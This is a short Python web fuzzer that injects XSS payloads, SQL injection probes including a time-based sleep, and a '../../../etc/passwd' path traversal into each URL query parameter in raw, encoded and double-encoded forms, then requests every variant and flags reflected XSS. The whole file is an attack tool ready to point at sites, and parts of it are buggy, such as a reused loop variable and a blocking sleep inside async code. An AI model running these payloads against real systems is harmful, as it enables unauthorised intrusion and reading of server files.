from urllib.parse import urlparse,parse_qs
import urllib
import copy
import asyncio
import aiohttp
import time


xss_payloads = ['<img src=1 onerror=`alert(1)`>','<iframe src=x></iframe>','javascript::alert(1)']
sqli_payloads = ["%27","\\","/","if(1,sleep(5),1)"]
lfi_payloads = ['../../../etc/passwd']


payloads = xss_payloads + sqli_payloads + lfi_payloads


check = []


def fuzz(url):
    url = urllib.parse.unquote(url, encoding='utf-8', errors='replace')
    up = urlparse(url)
    try:
        if up.query == '':
            return
        for ext in ['.js','.jpg','.css','.gif','.png','.txt']:
            if ext in up.path:
                return
    except:
        return
	
    print('Start fuzz ' + url)
    query = parse_qs(up.query)


    #Fuzz
    for i in query:
        for j in payloads:
            queryCheck = copy.deepcopy(query)
            upCheck = copy.deepcopy(up)
            queryCheck[i][0] = j

            queryTarget = ''
            for i in queryCheck:
                data = i + '=' + queryCheck[i][0] + '&'
                queryTarget += data

            url = up.scheme + '://' + up.netloc + up.path + '?' + queryTarget

            check.append(url)

    for i in query:
        for j in payloads:
            queryCheck = copy.deepcopy(query)
            upCheck = copy.deepcopy(up)
            queryCheck[i][0] = urllib.parse.quote(j)

            queryTarget = ''
            for i in queryCheck:
                data = i + '=' + queryCheck[i][0] + '&'
                queryTarget += data

            url = up.scheme + '://' + up.netloc + up.path + '?' + queryTarget

            check.append(url)
    for i in query:
        for j in payloads:
            queryCheck = copy.deepcopy(query)
            upCheck = copy.deepcopy(up)
            queryCheck[i][0] = urllib.parse.quote(urllib.parse.quote(j))

            queryTarget = ''
            for i in queryCheck:
                data = i + '=' + queryCheck[i][0] + '&'
                queryTarget += data

            url = up.scheme + '://' + up.netloc + up.path + '?' + queryTarget

            check.append(url)


    loop = asyncio.get_event_loop()
    tasks = [checkUrl(url) for url in check]
    loop.run_until_complete(asyncio.wait(tasks))
    loop.close()



 
async def checkUrl(url):
    async with aiohttp.ClientSession() as session:
        try:
            time.sleep(2)
            url = url[:-1]
            async with session.get(url) as resp:
                text = await resp.text()
                for i in xss_payloads:
                    if i in text:
                        print ("XSS ==> " + url)
        except:
            pass

